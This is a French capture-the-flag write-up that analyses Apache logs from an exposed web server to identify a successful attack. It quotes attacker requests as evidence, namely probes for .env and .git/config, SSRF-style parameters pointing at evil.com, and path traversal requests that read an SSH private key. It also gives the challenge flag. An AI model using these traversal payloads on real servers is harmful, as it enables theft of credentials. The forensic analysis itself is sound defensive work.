# Web Logs

## Contexte

On dispose des logs d'un serveur web exposé sur Internet (webserver_log.gz, ~25 470 lignes). L'objectif est d'identifier l'attaque qui a réussi et d'en extraire le flag au format : 

```FCSC{CWE-XXXXX-MM/DD-requests}```

## Etape 1 - Reconnaissance du format de logs

Les logs suivent le format Apache Combined Log :

```May  7 00:40:21 front web-server mywebsite:80 127.0.0.1 - - [07/May/2025:00:40:21 +0000] "GET /... HTTP/1.0" <status> <size> "<referer>" "<UA>" ```

La taille de réponse est le premier indicateur de si une requête a retourné quelque chose d'inhabituel.

## Etape 2 - Identification du bruit

Les logs contiennent de nombreuses tentatives qui n'ont pas abouti :
* Tentatives bloquées (403) : Accès à `.env`, `.git/config`, `wp-config.php` → tous en 403

* Fausses pistes (200 mais réponse identique) : Des tentatives de type SSRF sont présentes avec des paramètres comme `?callback=`, `?uri=`, `?dest=`, `?csp_report_uri=`, etc. Elles retournent bien un 200, mais avec exactement 2272 bytes (la taille de la page d'accueil par défaut). Ce qui signifie que le serveur a simplement ignoré ces paramètres.

``` bash
GET /?csp_report_uri=http://evil.com   200  2272  ← page d'accueil, pas d'effet
GET /?uri=http://localhost             200  2272  ← idem
GET /?callback=http://                 200  2272  ← idem
```

## Etape 3 - Identification de l'attaque réussie

En filtrant les requêtes 200 avec une taille différente de 2272, deux requêtes se démarquent nettement :

```bash
[07/May/2025:00:40:21 +0000] "GET /?asset=../../../../home/webserver/.ssh/id_rsa HTTP/1.0" 200 2500 ...
[07/May/2025:00:40:22 + +0000] "GET /?asset=../../../../home/webserver/.ssh/known_hosts HTTP/1.0" 200 2750 ...
```

## Etape 5 - Classification

L'attaque exploite une traversée de chemin (path traversal) via le paramètre `?asset=`.

``
CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
``

## Flag

```
FCSC{CWE-22-05/07-/?asset=../../../../home/webserver/.ssh/id_rsa-/?asset=../../../../home/webserver/.ssh/known_hosts}
```